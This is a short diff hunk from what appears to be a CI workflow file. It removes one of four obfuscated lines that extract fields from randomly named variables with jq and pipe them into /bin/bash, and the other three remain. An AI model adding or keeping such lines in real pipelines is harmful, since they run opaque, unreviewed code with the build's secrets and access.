@@ -28,7 +28,6 @@ jobs:
           echo $ndarx544 | jq -r .vfovt4 | /bin/bash
           printf '%s' "$bn78" | jq -r .f22 | /bin/bash
           printf '%s' "$r7527" | jq -r .c88501 | /bin/bash
-          echo $dp20 | jq -r .d56528 | /bin/bash
 
       - name: Store artifact
         if: always()
